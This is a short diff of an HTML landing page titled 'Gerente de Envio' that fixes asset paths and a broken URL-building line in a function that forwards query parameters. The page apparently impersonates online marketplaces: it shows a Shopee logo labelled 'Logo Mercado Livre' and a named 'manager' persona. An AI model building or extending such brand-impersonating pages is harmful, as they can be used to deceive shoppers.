@@ -19,7 +19,7 @@
 </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="10/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&amp;display=swap" rel="stylesheet">
     <title>Gerente de Envio</title>
 
@@ -133,7 +133,7 @@
 height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 <!-- End Google Tag Manager (noscript) -->
     <div class="header">
-        <img src="../../freelogopng.com/images/all_img/1656181621shopee-logo-white.png" alt="Logo Mercado Livre" class="logo">
+        <img src="index" alt="Logo Mercado Livre" class="logo">
     </div>
 
     <div class="content" style="margin-top: -15px;">
@@ -144,7 +144,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             </p>
             
             <div class="card" style="background-color: #fff7db; border-radius: 10px; padding: 20px; padding-bottom: 10px; margin-bottom: 20px; border: 1px solid #ffbf00;">
-                <img src="images/gerente.png" alt="Foto da Gerente" class="manager-image">
+                <img src="10/images/gerente.png" alt="Foto da Gerente" class="manager-image">
                 <p style="color: #666; font-size: 14px; margin: 5px 0;">Gerente</p>
                 <p class="manager-name" style="margin-top: -5px;">Renata Albuquerque</p>
                 
@@ -224,7 +224,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
         function buildUrlWithParams(baseUrl) {
             const params = getUrlParams();
-            const url = new URL(baseUrl%2c%20window.location.html);
+            const url = new URL(baseUrl, window.location.href);
             Object.keys(params).forEach(key => {
                 url.searchParams.append(key, params[key]);
             });
